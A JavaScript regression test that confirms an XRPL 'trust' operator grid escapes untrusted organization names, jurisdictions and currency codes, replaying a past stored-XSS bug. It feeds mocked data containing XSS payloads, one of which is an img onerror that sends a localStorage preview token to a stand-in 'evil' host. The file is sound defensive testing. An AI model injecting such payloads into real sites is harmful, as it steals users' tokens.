// Regression test for the /trust/ operator grid.
//
// The grid is built by string concatenation into innerHTML, and the strings
// it renders are not ours: identity_org_name / owner_label.name come from the
// [[ORGANIZATION]] block of the .well-known/xrp-ledger.toml published at
// whatever host the operator's own XRPL Domain field points at. Anyone who can
// pay for a PermissionedDomain can publish one. Before the escapeHtml() calls
// went in, an org name of `<img src=x onerror=...>` executed on
// xrpl-utilities.com, next to the preview token in localStorage and the x402
// payment UI. This test replays that payload.
//
// Run: node tests/trust_xss_test.mjs

import fs from 'node:fs';
import vm from 'node:vm';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const repo = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const html = fs.readFileSync(path.join(repo, 'trust/index.html'), 'utf8');

// Pull the directory client out of the page rather than pinning line numbers.
const marker = html.indexOf('<!-- Trust directory + stats client -->');
if (marker === -1) throw new Error('trust directory client block not found');
const open = html.indexOf('<script>', marker);
const close = html.indexOf('</script>', open);
const src = html.slice(open + '<script>'.length, close);

function fakeEl() {
  return {
    innerHTML: '', textContent: '', className: '',
    classList: { add() {}, remove() {}, contains() { return false; } },
    style: {}, dataset: {}, children: [],
    appendChild(c) { this.children.push(c); return c; },
    addEventListener() {}, querySelectorAll() { return []; },
    setAttribute() {}, removeAttribute() {}, remove() {},
  };
}
const nodes = {};
const document = {
  getElementById(id) { nodes[id] = nodes[id] || fakeEl(); return nodes[id]; },
  createElement() { return fakeEl(); },
  querySelectorAll() { return []; },
  addEventListener() {},
};

const PAYLOAD = `<img src=x onerror="fetch('https://evil/'+localStorage.getItem('xru_preview_token_v1'))">`;
const OPERATORS = {
  operators: [{
    operator_address: 'rEvil"><script>alert(1)</script>',
    identity_org_name: PAYLOAD,
    jurisdiction: '"><svg onload=alert(2)>',
    domain_count: 1,
    permissioned_offers_24h: 3,
    unique_traders_24h: 1,
    amm_events_24h: 0,
    volume_24h_by_pair: [{
      gets_value: '1200', gets_currency: '<img src=x onerror=alert(3)>',
      pays_value: '5', pays_currency: '"><script>alert(4)</script>',
      consumed_offers_count: 2,
    }],
  }],
};
const JURISDICTIONS = {
  combined_entity_count_by_jurisdiction: [
    { jurisdiction: '<img src=x onerror=alert(5)>', count: 2 },
  ],
  unattributed: {},
};

const ctx = {
  document, console, JSON, Math,
  window: { PreviewToken: null },
  localStorage: { getItem() { return null; }, setItem() {} },
  sessionStorage: { getItem() { return null; }, setItem() {} },
  setTimeout, clearTimeout, setInterval, clearInterval,
  fetch: async (u) => ({
    ok: true,
    json: async () => (String(u).includes('/permissioned-domains/operators')
      ? OPERATORS
      : JURISDICTIONS),
  }),
};
ctx.globalThis = ctx;
vm.createContext(ctx);
vm.runInContext(src, ctx);

let fails = 0;
function check(name, cond, extra = '') {
  console.log((cond ? 'PASS ' : 'FAIL ') + name + (cond ? '' : '  ' + extra));
  if (!cond) fails++;
}

await vm.runInContext('loadOperators()', ctx);
const grid = nodes['operators-grid'].innerHTML;
check('operator grid rendered', grid.length > 100, grid.slice(0, 200));
check('org name is not injected as markup', !/<img/i.test(grid), grid.slice(0, 400));
check('org name still displays, escaped', grid.includes('&lt;img src=x onerror='), grid.slice(0, 400));
check('address cannot break out of the card', !/<script/i.test(grid));
check('jurisdiction cannot break out of title=""', !/<svg/i.test(grid));
// The escaped payload still contains the literal text "alert(3)"; what matters
// is that no '<' from it survives as markup.
check('currency codes cannot inject',
  grid.includes('&lt;img src=x onerror=alert(3)&gt;') && grid.includes('&lt;script&gt;alert(4)'),
  grid.slice(Math.max(0, grid.indexOf('1.20K') - 40), grid.indexOf('1.20K') + 200));
check('escaped currency still renders its amount', grid.includes('1.20K &lt;img'));

await vm.runInContext('loadJurisdictions()', ctx);
const jgrid = nodes['jurisdictions-grid'].innerHTML;
check('jurisdiction grid rendered', jgrid.length > 20, jgrid);
check('unmapped ISO code cannot inject', !/<img/i.test(jgrid), jgrid.slice(0, 300));

console.log(fails ? `${fails} FAILED` : 'trust operator grid: ok');
process.exit(fails ? 1 : 0);
